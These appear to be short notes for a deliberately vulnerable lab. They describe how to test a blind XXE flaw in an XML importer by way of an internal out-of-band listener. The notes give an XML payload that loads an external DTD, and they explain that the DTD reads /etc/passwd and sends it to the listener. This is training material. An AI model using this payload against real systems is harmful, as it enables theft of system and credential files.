# OOB testing notes

The stack includes an internal listener at `http://oob:8000/`.

From the vulnerable XML importer, the intended blind XXE shape is:

    <!DOCTYPE product SYSTEM "http://oob:8000/payload.dtd">
    <product><name>test</name><price>1</price></product>

Then watch:

    docker compose logs -f oob

The included DTD attempts to read `/etc/passwd` from the **web container** and send the value to the OOB service.

For a more realistic exercise, replace the built-in DTD with your own external DTD and vary the target file. Keep all testing inside this Docker network.
